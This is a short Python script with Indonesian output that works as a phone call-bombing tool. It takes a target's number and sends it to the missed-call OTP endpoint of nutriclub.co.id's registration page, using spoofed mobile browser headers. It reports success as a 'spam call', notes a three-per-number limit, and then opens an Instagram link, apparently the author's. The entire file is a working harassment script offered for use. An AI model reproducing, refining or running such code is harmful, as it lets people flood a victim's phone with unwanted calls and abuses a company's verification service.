import requests as pp
import json,os,sys

os.system('clear')
logo = """
 limit 3x setiap nomor tod
  = 081234567891
«~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~»\n"""

os.system('clear')
print(logo)
p = input(" No Target : ")


api_url = "https://www.nutriclub.co.id/otp/?phone="+p+"&old_phone="+p

headers = {
"Host": "www.nutriclub.co.id",
"content-length": "0","accept":
"application/json, text/javascript, */*; q=0.01",
"x-requested-with": "XMLHttpRequest",
"save-data": "on",
"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
"origin": "https://www.nutriclub.co.id",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty","referer": "https://www.nutriclub.co.id/account/register",
}


respond = pp.post(api_url,headers).text

status = json.loads(respond)["StatusMessage"]
if status == "Request misscall berhasil":
     print("\n {+} Spam Call Untuk No "+ p +" Berhasil {+} \n")
     os.system("start \"\" https://www.instagram.com/panci.warteg_ot/")
else:
     print("\n {×} Spam sudah dilakukan 3x ke nomor "+ p + " » Gagal \n")

